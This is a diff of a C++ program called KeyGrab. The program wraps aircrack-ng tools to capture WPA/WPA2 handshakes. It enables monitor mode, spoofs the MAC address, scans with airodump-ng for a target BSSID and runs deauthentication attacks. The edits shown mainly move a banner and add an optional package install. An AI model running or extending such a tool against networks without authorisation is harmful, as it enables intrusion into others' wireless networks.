@@ -1,9 +1,10 @@
 /***********************************************
 *FILENAME:		KeyGrab.cpp 
 *AUTHOR: 		Ryan Sisco
-*REQUIREMENTS:	macchanger & aircrack-ng plugins
-*DATE:			JAN 2017
-*DESCRIPTION:	intercepts WPA/WPA2 password keys
+*REQUIREMENTS:	Macchanger & Aircrack-ng plugins
+*DATE CREATED:	Jan 2017
+*LAST UPDATE: 	Nov 2017
+*DESCRIPTION:	Intercepts WPA/WPA2 password keys
 ***********************************************/
 
 
@@ -21,12 +22,12 @@ void reset_mac();						//resets mac address
 void gnome_terminal(string, string);	//opens second terminal and executes deauth
 void organize(string);					//stores Keys in folders
 void closing();							//closes out program with text and spacing
-
-
+void intro();							//updates/installs if needed
 
 
 
 int main() {
+	intro();
 	string dir, t_mac_a, bssid, channel, deauth;
 	bssid = get_bssid(bssid); 
 	channel = get_channel(channel);
@@ -146,19 +147,10 @@ void organize(string mac) {
 *			   prompts for bssid, returns it               
 ***********************************************/
 string get_bssid(string bssid) {
-	system("clear");
-	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
-	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
-	system("echo \"$(tput setaf 5)$(tput bold)|    K E Y G R A B    |$(tput bold)$(tput sgr 0)\"");
-	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
-	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
-	cout << string(2, '\n');
-	cout << "Launching..." << endl;
-	system("sleep 2");
 	system ("airmon-ng start wlan0");
 	randomize();
 	system ("airodump-ng wlan0mon");
-	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target BSSID$(tput bold)$(tput smul)$(tput sgr 0)\"");
 	cin >> bssid;
 	return bssid;
 }
@@ -174,8 +166,7 @@ string get_bssid(string bssid) {
 *              monitor mode
 ***********************************************/
 string get_channel(string channel) {
-	
-	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel:$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel$(tput sgr 0)\"");
 	cin >> channel;
 	system("airmon-ng stop wlan0mon");
 	return channel;
@@ -193,5 +184,35 @@ string get_channel(string channel) {
 ***********************************************/
 void closing() {
 	cout << string(5,'\n');
-	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
+	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning$(tput sgr 0)\"");
+}
+
+
+
+
+
+/***********************************************
+*FUNCTION:     intro
+*RETURNS:	   nothing
+*DESCRIPTION:  greets, installs/updates if   
+*              requested
+***********************************************/
+void intro() {
+	system("clear");
+	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 5)$(tput bold)|    K E Y G R A B    |$(tput bold)$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
+	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
+	cout << string(2, '\n');
+	string choice;
+	cout << "Install/Update? (Y/N):  ";
+	cin >> choice;
+	if ((choice == "y") || (choice == "Y")) {
+		system("apt-get install aircrack-ng");
+		system("apt-get install macchanger");
+	}
+	cout << string(2, '\n');
+	cout << "Launching..." << endl;
+	system("sleep 2");
 }
